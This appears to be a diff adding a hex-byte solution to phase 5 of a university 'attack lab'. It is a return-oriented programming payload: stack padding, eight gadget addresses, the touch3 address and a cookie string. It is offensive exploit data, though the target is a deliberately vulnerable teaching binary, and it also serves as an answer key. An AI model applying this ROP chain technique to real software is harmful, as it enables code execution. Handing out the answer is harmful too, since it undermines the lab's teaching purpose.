@@ -1,0 +1,35 @@
+/* buffer in stack 56 bytes */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+/* gadget 1: movq rsp, rax */
+36 1a 40 00 00 00 00 00
+
+/* gadget 2: movq rax, rdi */
+fc 19 40 00 00 00 00 00
+
+/* gadget 3: pop rax \\ nop */
+ee 19 40 00 00 00 00 00
+
+/* relative postion of string to rsp */
+48 00 00 00 00 00 00 00
+
+/* gadget 4: movl eax, ecx \\ testb(nop) */
+3d 1a 40 00 00 00 00 00
+
+/* gadget 5: movl ecx, edx \\ andb(nop) */
+5e 1a 40 00 00 00 00 00
+
+/* gadget 6: movl edx, esi \\ nop */
+30 1a 40 00 00 00 00 00
+
+/* gadget 7: rax = rdi + rsi */
+1b 1a 40 00 00 00 00 00
+
+/* gadget 8: movq rax, rdi */
+fc 19 40 00 00 00 00 00
+
+/* touch3 address */
+42 19 40 00 00 00 00 00
+
+/* cookie string "5268a3b3" */
+35 32 36 38 61 33 62 33 00
